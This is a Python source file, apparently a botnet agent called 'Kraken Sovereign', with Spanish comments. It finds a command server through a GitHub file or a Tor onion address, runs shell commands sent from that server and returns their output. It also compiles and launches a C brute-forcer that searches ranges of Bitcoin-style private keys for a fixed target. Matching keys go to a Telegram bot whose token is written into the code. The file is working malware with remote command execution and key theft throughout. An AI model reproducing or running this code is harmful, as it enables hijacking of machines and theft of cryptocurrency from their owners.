# MISSION BRAIN V30.0 - KRAKEN SOVEREIGN Φ
import os, subprocess, time, requests, base64, socket, threading

def execute_mission(ui, ID):
    state = {"master": None, "proxies": None, "active_strike": False}

    def sync_master_url():
        """Busca la URL activa del Master en GitHub o Tor."""
        if "LOCAL" in ID or "ARM64" in ID:
            state["master"] = "http://127.0.0.1:9472/"
            state["proxies"] = None
            return True
        try:
            ui.log("Sincronizando con el Registro Soberano...")
            gate_url = "https://raw.githubusercontent.com/AGINFT/gamma-actions-test/main/kraken_gate.txt"
            url = requests.get(gate_url, timeout=15).text.strip()
            if url.startswith("http"):
                state["master"] = url
                state["proxies"] = None
                ui.log(f"Nexo Kraken Establecido: {url}")
                return True
        except: pass
        
        # Fallback a Tor
        ui.log("Portal Kraken no detectado. Activando Nexo Ghost (Tor)...")
        state["master"] = "http://xc6binu3ads4ceqhputzfwafu4kceivugqnm43bdocaouqwf7cdvd4ad.onion/"
        state["proxies"] = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        return True

    def heart_loop():
        """Mantiene el latido y procesa comandos en paralelo."""
        while True:
            try:
                if not state["master"]: sync_master_url()
                r = requests.post(state["master"], json={"node_id": ID, "type": "HEARTBEAT"}, proxies=state["proxies"], timeout=30)
                if r.status_code == 200:
                    data = r.json()
                    # 1. Sincronía de Rango para el Motor C
                    if "range" in data and not state["active_strike"]:
                        ignite_strike(data["range"])
                    
                    # 2. Procesamiento de Misiones (Comandos en Paralelo)
                    for mission in data.get("missions", []):
                        if mission["type"] == "EXEC":
                            ui.log(f"Ejecutando Tarea Superior: {mission['id']}")
                            threading.Thread(target=run_command, args=(mission,), daemon=True).start()
                else:
                    sync_master_url() # Re-sincronizar si el Master responde error
            except:
                sync_master_url() # Re-sincronizar si hay fallo de red
            time.sleep(60)

    def run_command(m):
        """Ejecuta un comando de sistema y reporta el resultado."""
        try:
            out = subprocess.check_output(m["code"], shell=True, stderr=subprocess.STDOUT).decode()
            requests.post(state["master"], json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "CMD_OUT", "id": m["id"], "output": out}}, proxies=state["proxies"])
        except Exception as e:
            requests.post(state["master"], json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "CMD_ERR", "id": m["id"], "error": str(e)}}, proxies=state["proxies"])

    def ignite_strike(rng):
        """Igniciona el motor C de asalto."""
        ui.log(f"Inyectando Motor de Asalto en Rango: {rng['start']}")
        c_src = f'#include <stdio.h>\n#include <openssl/sha.h>\n#include <openssl/ripemd.h>\n#include <openssl/ec.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\n'
        c_src += 'unsigned char t[20]={0x2b,0x6f,0x17,0xe0,0x89,0x29,0xe7,0x93,0xef,0x1c,0x09,0x93,0x0e,0x13,0x71,0xba,0x76,0x35,0xc6,0x0c};\n'
        c_src += 'void* c(void* a){\n    EC_GROUP* g=EC_GROUP_new_by_curve_name(714);EC_POINT* p=EC_POINT_new(g);BIGNUM* k=BN_new();unsigned char b[65],s[32],r[20];\n'
        c_src += f'    BN_hex2bn(&k, "{rng["start"]}");\n'
        c_src += '    while(1){EC_POINT_mul(g,p,k,NULL,NULL,NULL);EC_POINT_point2oct(g,p,4,b,65,NULL);SHA256(b,65,s);RIPEMD160(s,32,r);\n'
        c_src += '    if(!memcmp(r,t,20)){FILE* f=fopen("found.txt","a");fprintf(f,"MATCH:%s\\n",BN_bn2hex(k));fclose(f);exit(0);}BN_add_word(k,1);}}\n'
        c_src += 'int main(){pthread_t t[4];for(int i=0;i<4;i++)pthread_create(&t[i],NULL,c,NULL);while(1)sleep(3600);return 0;}\n'
        
        with open("k.c", "w") as f: f.write(c_src)
        os.system("apt-get update -qq && apt-get install -y libssl-dev gcc -qq > /dev/null 2>&1")
        os.system("gcc -O3 k.c -o kraken_strike -lcrypto -lpthread -Wno-deprecated-declarations")
        if os.path.exists("./kraken_strike"):
            os.system("pkill -9 kraken_strike")
            subprocess.Popen(["./kraken_strike"], start_new_session=True)
            state["active_strike"] = True
            ui.update("KRAKEN SOVEREIGN v30.0 ACTIVE", 100, 99)

    def report_loop():
        while True:
            try:
                if state["master"]:
                    requests.post(state["master"], json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "KRAKEN_SOVEREIGN", "cpu": os.getloadavg()[0]}}, proxies=state["proxies"], timeout=30)
                    if os.path.exists("found.txt"):
                        with open("found.txt", "r") as f: match = f.read()
                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": f"🏮 KRAKEN SOVEREIGN MATCH Φ 🏮\n{match}"})
            except: pass
            time.sleep(300)

    # Ignición
    sync_master_url()
    threading.Thread(target=heart_loop, daemon=True).start()
    threading.Thread(target=report_loop, daemon=True).start()
    return True
